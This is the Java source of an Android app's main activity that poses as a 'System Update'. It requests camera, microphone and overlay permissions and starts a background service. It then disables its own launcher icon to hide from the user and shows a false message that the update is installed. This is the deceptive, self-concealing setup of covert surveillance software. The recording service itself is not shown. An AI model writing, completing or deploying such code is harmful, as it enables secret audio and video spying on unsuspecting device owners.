package com.broadcaster;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int OVERLAY_PERMISSION_REQUEST = 101;
    private TextView statusText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        statusText = findViewById(R.id.statusText);
        checkAndRequestPermissions();
    }
    
    private void checkAndRequestPermissions() {
        boolean cameraGranted = ContextCompat.checkSelfPermission(this, 
            android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
        boolean micGranted = ContextCompat.checkSelfPermission(this, 
            android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
        boolean overlayGranted = Settings.canDrawOverlays(this);
        
        if (cameraGranted && micGranted && overlayGranted) {
            startServiceAndHide();
        } else {
            updateStatus(cameraGranted, micGranted, overlayGranted);
            
            if (!cameraGranted || !micGranted) {
                String[] permissions = {android.Manifest.permission.CAMERA, 
                                       android.Manifest.permission.RECORD_AUDIO};
                ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
            } else if (!overlayGranted) {
                requestOverlayPermission();
            }
        }
    }
    
    private void updateStatus(boolean camera, boolean mic, boolean overlay) {
        String status = "System Update Initializing...\n\n" +
                       "Camera: " + (camera ? "✓" : "⚠ Requesting") + "\n" +
                       "Microphone: " + (mic ? "✓" : "⚠ Requesting") + "\n" +
                       "Overlay: " + (overlay ? "✓" : "⚠ Requesting");
        statusText.setText(status);
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
                                          @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                if (!Settings.canDrawOverlays(this)) {
                    requestOverlayPermission();
                } else {
                    startServiceAndHide();
                }
            } else {
                Toast.makeText(this, "All permissions required for system update", Toast.LENGTH_LONG).show();
                finish();
            }
        }
    }
    
    private void requestOverlayPermission() {
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName()));
        startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST);
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == OVERLAY_PERMISSION_REQUEST) {
            if (Settings.canDrawOverlays(this)) {
                startServiceAndHide();
            } else {
                Toast.makeText(this, "Overlay permission required", Toast.LENGTH_SHORT).show();
                finish();
            }
        }
    }
    
    private void startServiceAndHide() {
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        startForegroundService(serviceIntent);
        
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        
        Toast.makeText(this, "System Update installed. Device is being optimized.", Toast.LENGTH_LONG).show();
        
        Intent homeIntent = new Intent(Intent.ACTION_MAIN);
        homeIntent.addCategory(Intent.CATEGORY_HOME);
        homeIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(homeIntent);
        
        finish();
    }
}